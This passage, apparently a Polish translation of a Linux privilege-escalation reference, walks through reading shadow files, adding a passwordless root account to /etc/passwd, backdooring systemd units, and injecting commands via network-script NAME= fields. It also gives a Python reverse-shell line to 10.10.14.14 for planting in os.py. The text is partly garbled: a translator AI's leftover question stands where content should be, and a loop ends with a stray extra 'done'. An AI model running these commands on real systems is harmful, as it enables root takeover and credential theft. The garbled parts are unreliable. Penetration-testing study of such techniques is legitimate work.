W zależności od systemu pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę lub może istnieć ich kopia zapasowa. Dlatego zaleca się **znaleźć wszystkie** i **sprawdzić, czy możesz je odczytać**, aby zobaczyć **czy znajdują się w nich hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach można znaleźć **password hashes** w pliku `/etc/passwd` (lub jego odpowiedniku).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Zapisywalny /etc/passwd

Najpierw wygeneruj hasło za pomocą jednego z poniższych poleceń.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Proszę wklej zawartość pliku src/linux-hardening/privilege-escalation/README.md, który mam przetłumaczyć na polski. Czy chcesz, żeby na końcu pliku dodać instrukcję (polecenia) tworzenia użytkownika `hacker` wraz z wygenerowanym hasłem, czy wolisz, by hasło było wstawione bezpośrednio w treści README?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Np: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Teraz możesz użyć polecenia `su` z `hacker:hacker`

Alternatywnie możesz użyć następujących linii, aby dodać użytkownika testowego bez hasła.\
OSTRZEŻENIE: możesz obniżyć bieżące bezpieczeństwo maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
UWAGA: Na platformach BSD `/etc/passwd` znajduje się w `/etc/pwd.db` i `/etc/master.passwd`, a `/etc/shadow` zostało przemianowane na `/etc/spwd.db`.

Należy sprawdzić, czy możesz **zapisywać do niektórych wrażliwych plików**. Na przykład, czy możesz zapisać do jakiegoś **pliku konfiguracyjnego usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli maszyna ma uruchomiony serwer **tomcat** i możesz **zmodyfikować plik konfiguracji usługi Tomcat w /etc/systemd/,** wtedy możesz zmienić linie:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twój backdoor zostanie uruchomiony przy następnym uruchomieniu tomcat.

### Sprawdź foldery

Następujące foldery mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Dziwna lokalizacja/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Zmodyfikowane pliki w ostatnich minutach
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Pliki Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml pliki
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrypty/binaria w PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki webowe**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające hasła

Przejrzyj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), wyszukuje **wiele możliwych plików, które mogą zawierać hasła**.\
**Innym interesującym narzędziem**, którego możesz użyć do tego, jest: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) która jest aplikacją open source służącą do odzyskiwania wielu haseł przechowywanych na lokalnym komputerze dla Windows, Linux & Mac.

### Logi

Jeśli potrafisz czytać logi, możesz znaleźć w nich **interesujące/poufne informacje**. Im dziwniejszy log, tym prawdopodobnie ciekawszy.\
Ponadto niektóre źle skonfigurowane (backdoored?) **audit logs** mogą pozwolić na **zapisywanie haseł** w audit logs, jak wyjaśniono w tym wpisie: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby **czytać logi, grupa** [**adm**](interesting-groups-linux-pe/index.html#adm-group) będzie naprawdę pomocna.

### Pliki Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Ogólne wyszukiwanie poświadczeń/Regex

Powinieneś również sprawdzić pliki zawierające słowo "**password**" w **nazwie** lub w **zawartości**, oraz szukać adresów IP i e-maili w logach, lub wzorców hashów (regexps).\
Nie będę tu wymieniać, jak to wszystko zrobić, ale jeśli jesteś zainteresowany możesz sprawdzić ostatnie kontrole, które wykonuje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki zapisywalne

### Python library hijacking

Jeśli wiesz **skąd** będzie uruchamiany skrypt python i **możesz zapisywać** w tym folderze lub możesz **modyfikować biblioteki python**, możesz zmodyfikować bibliotekę os i backdoor it (jeśli możesz zapisywać tam, gdzie będzie uruchamiany skrypt python, skopiuj i wklej bibliotekę os.py).

Aby **backdoor the library**, po prostu dodaj na końcu biblioteki os.py następującą linię (zmień IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Eksploatacja logrotate

Luka w `logrotate` pozwala użytkownikom z **uprawnieniami zapisu** do pliku logu lub jego katalogów nadrzędnych na potencjalne uzyskanie eskalacji uprawnień. Dzieje się tak, ponieważ `logrotate`, często uruchamiany jako **root**, można zmanipulować tak, by wykonywał dowolne pliki, szczególnie w katalogach takich jak _**/etc/bash_completion.d/**_. Ważne jest sprawdzenie uprawnień nie tylko w _/var/log_, ale też w każdym katalogu, gdzie stosowana jest rotacja logów.

> [!TIP]
> Ta luka dotyczy `logrotate` w wersji `3.18.0` i starszych

Bardziej szczegółowe informacje o luce można znaleźć na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Tę lukę można eksploatować za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta luka jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** więc za każdym razem, gdy możesz modyfikować logi, sprawdź, kto nimi zarządza, i zobacz, czy możesz eskalować uprawnienia, podmieniając logi na symlinki.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Jeśli z jakiegoś powodu użytkownik jest w stanie **zapisć** skrypt `ifcf-<whatever>` do _/etc/sysconfig/network-scripts_ **lub** **zmodyfikować** istniejący, to twój **system jest pwned**.

Skrypty sieciowe, np. _ifcg-eth0_, są używane do połączeń sieciowych. Wyglądają dokładnie jak pliki .INI. Jednak są one \~sourced\~ na Linuxie przez Network Manager (dispatcher.d).

W moim przypadku atrybut `NAME=` w tych skryptach sieciowych nie jest obsługiwany poprawnie. Jeśli w nazwie znajduje się **spacja, system próbuje wykonać część po spacji**. To oznacza, że **wszystko po pierwszej spacji jest wykonywane jako root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Zwróć uwagę na spację między Network a /bin/id_)

### **init, init.d, systemd i rc.d**

Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami w Linuksie**. Zawiera skrypty do `start`, `stop`, `restart`, a czasem `reload` usług. Można je uruchamiać bezpośrednio lub przez dowiązania symboliczne znajdujące się w `/etc/rc?.d/`. Alternatywna ścieżka w systemach Redhat to `/etc/rc.d/init.d`.

Z drugiej strony, `/etc/init` jest związany z **Upstart**, nowszym systemem **service management** wprowadzonym przez Ubuntu, wykorzystującym pliki konfiguracyjne do zarządzania usługami. Mimo przejścia na Upstart, skrypty SysVinit są nadal używane obok konfiguracji Upstart z powodu warstwy kompatybilności w Upstart.

**systemd** wyłania się jako nowoczesny menedżer inicjalizacji i usług, oferując zaawansowane funkcje takie jak uruchamianie demonów na żądanie, zarządzanie automountami oraz migawki stanu systemu. Organizuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucyjnych i `/etc/systemd/system/` dla modyfikacji administratora, usprawniając proces administracji systemem.

## Inne triki

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks często hookują syscall, aby udostępnić uprzywilejowaną funkcjonalność jądra menedżerowi w przestrzeni użytkownika. Słaba autoryzacja menedżera (np. sprawdzanie sygnatur oparte na porządku FD lub słabe schematy haseł) może pozwolić lokalnej aplikacji podszyć się pod menedżera i eskalować do root na urządzeniach już zrootowanych. Więcej informacji i szczegóły eksploatacji tutaj:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Odkrywanie usług sterowane regexami w VMware Tools/Aria Operations może wydobyć ścieżkę do binarki z linii poleceń procesu i uruchomić ją z -v w uprzywilejowanym kontekście. Permisywne wzorce (np. użycie \S) mogą dopasować nasłuchiwacze przygotowane przez atakującego w zapisywalnych lokalizacjach (np. /tmp/httpd), prowadząc do wykonania jako root (CWE-426 Untrusted Search Path).

Dowiedz się więcej i zobacz uogólniony wzorzec zastosowalny dla innych stosów discovery/monitoring tutaj:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Mechanizmy zabezpieczeń jądra

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Najlepsze narzędzie do wyszukiwania lokalnych wektorów privilege escalation w Linuksie:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (dostęp fizyczny):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
